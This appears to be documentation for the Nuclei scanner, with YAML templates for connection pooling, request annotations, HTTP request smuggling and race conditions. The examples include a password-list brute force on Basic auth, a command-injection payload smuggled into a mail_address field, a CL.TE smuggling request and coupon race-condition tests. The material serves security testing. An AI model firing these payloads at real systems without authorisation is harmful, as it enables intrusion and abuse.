An example template using HTTP connection pooling-

```yaml
id: fuzzing-example
info:
  name: Connection pooling example
  author: pdteam
  severity: info

http:

  - raw:
      - |
        GET /protected HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic {{base64('admin:§password§')}}

    attack: batteringram
    payloads:
      password: password.txt
    threads: 40

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "Unique string"
        part: body
```

# **Request Tampering**

Learn about request tampering in HTTP with Nuclei

## **Requests Annotation**

Request inline annotations allow performing per request properties/behavior override. They are very similar to python/java class annotations and must be put on the request just before the RFC line. Currently, only the following overrides are supported:

- **`@Host:`** which overrides the real target of the request (usually the host/ip provided as input). It supports syntax with ip/domain, port, and scheme, for example: **`domain.tld`**, **`domain.tld:port`**, **`http://domain.tld:port`**
- **`@tls-sni:`** which overrides the SNI Name of the TLS request (usually the hostname provided as input). It supports any literals. The special value **`request.host`** uses the **`Host`** header and **`interactsh-url`** uses an interactsh generated URL.
- **`@timeout:`** which overrides the timeout for the request to a custom duration. It supports durations formatted as string. If no duration is specified, the default Timeout flag value is used.

The following example shows the annotations within a request:

```yaml
- |
  @Host: https://projectdiscovery.io:443
  POST / HTTP/1.1
  Pragma: no-cache
  Host: {{Hostname}}
  Cache-Control: no-cache, no-transform
  User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
```

This is particularly useful, for example, in the case of templates with multiple requests, where one request after the initial one needs to be performed to a specific host (for example, to check an API validity):

```yaml
http:
  - raw:
      # this request will be sent to {{Hostname}} to get the token
      - |
        GET /getkey HTTP/1.1
        Host: {{Hostname}}
        
      # This request will be sent instead to https://api.target.com:443 to verify the token validity
      - |
        @Host: https://api.target.com:443
        GET /api/key={{token}} HTTP/1.1
        Host: api.target.com:443

    extractors:
      - type: regex
        name: token
        part: body
        regex:
          # random extractor of strings between prefix and suffix
          - 'prefix(.*)suffix'

    matchers:
      - type: word
        part: body
        words:
          - valid token
```

Example of a custom **`timeout`** annotations -

```yaml
- |
  @timeout: 25s
  POST /conf_mail.php HTTP/1.1
  Host: {{Hostname}}
  Content-Type: application/x-www-form-urlencoded
  
  mail_address=%3B{{cmd}}%3B&button=%83%81%81%5B%83%8B%91%97%90M
```

Example of **`sni`** annotation with **`interactsh-url`** -

```yaml
- |
  @tls-sni: interactsh-url
  POST /conf_mail.php HTTP/1.1
  Host: {{Hostname}}
  Content-Type: application/x-www-form-urlencoded
  
  mail_address=%3B{{cmd}}%3B&button=%83%81%81%5B%83%8B%91%97%90M
```

## **Smuggling**

HTTP Smuggling is a class of Web-Attacks recently made popular by [**Portswigger’s Research**](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)into the topic. For an in-depth overview, please visit the article linked above.

In the open source space, detecting http smuggling is difficult particularly due to the requests for detection being malformed by nature. Nuclei is able to reliably detect HTTP Smuggling vulnerabilities utilising the [**rawhttp**](https://github.com/projectdiscovery/rawhttp) engine.

The most basic example of an HTTP Smuggling vulnerability is CL.TE Smuggling. An example template to detect a CE.TL HTTP Smuggling vulnerability is provided below using the **`unsafe: true`** attribute for rawhttp based requests.

```yaml
id: CL-TE-http-smuggling

info:
  name: HTTP request smuggling, basic CL.TE vulnerability
  author: pdteam
  severity: info
  reference: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te

http:
  - raw:
    - |+
      POST / HTTP/1.1
      Host: {{Hostname}}
      Connection: keep-alive
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 6
      Transfer-Encoding: chunked
      
      0
      
      G      
    - |+
      POST / HTTP/1.1
      Host: {{Hostname}}
      Connection: keep-alive
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 6
      Transfer-Encoding: chunked
      
      0
      
      G
            
    unsafe: true
    matchers:
      - type: word
        words:
          - 'Unrecognized method GPOST'
```

# **Race Conditions**

Learn about using race conditions with Nuclei

Race Conditions are another class of bugs not easily automated via traditional tooling. Burp Suite introduced a Gate mechanism to Turbo Intruder where all the bytes for all the requests are sent expect the last one at once which is only sent together for all requests synchronizing the send event.

We have implemented **Gate** mechanism in nuclei engine and allow them run via templates which makes the testing for this specific bug class simple and portable.

To enable race condition check within template, **`race`** attribute can be set to **`true`** and **`race_count`** defines the number of simultaneous request you want to initiate.

Below is an example template where the same request is repeated for 10 times using the gate logic.

```yaml
id: race-condition-testing

info:
  name: Race condition testing
  author: pdteam
  severity: info

http:
  - raw:
      - |
        POST /coupons HTTP/1.1
        Host: {{Hostname}}

        promo_code=20OFF        

    race: true
    race_count: 10

    matchers:
      - type: status
        part: header
        status:
          - 200
```

You can simply replace the **`POST`** request with any suspected vulnerable request and change the **`race_count`** as per your need, and it’s ready to run.

```bash
nuclei -t race.yaml -target https://api.target.com
```

**Multi request race condition testing**

For the scenario when multiple requests needs to be sent in order to exploit the race condition, we can make use of threads.

```yaml
		threads: 5
    race: true
```

**`threads`** is a total number of request you wanted make with the template to perform race condition testing.

Below is an example template where multiple (5) unique request will be sent at the same time using the gate logic.

```yaml
id: multi-request-race

info:
  name: Race condition testing with multiple requests
  author: pd-team
  severity: info

http:
  - raw:  
      - |
        POST / HTTP/1.1
        Pragma: no-cache
        Host: {{Hostname}}
        Cache-Control: no-cache, no-transform
        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0

        id=1
        
      - |
        POST / HTTP/1.1
        Pragma: no-cache
        Host: {{Hostname}}
        Cache-Control: no-cache, no-transform
        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0

        id=2

      - |
        POST / HTTP/1.1
        Pragma: no-cache
        Host: {{Hostname}}
        Cache-Control: no-cache, no-transform
        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0

        id=3

      - |
        POST / HTTP/1.1
        Pragma: no-cache
        Host: {{Hostname}}
        Cache-Control: no-cache, no-transform
        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0

        id=4

      - |
        POST / HTTP/1.1
        Pragma: no-cache
        Host: {{Hostname}}
        Cache-Control: no-cache, no-transform
        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0

        id=5

    threads: 5
    race: true
```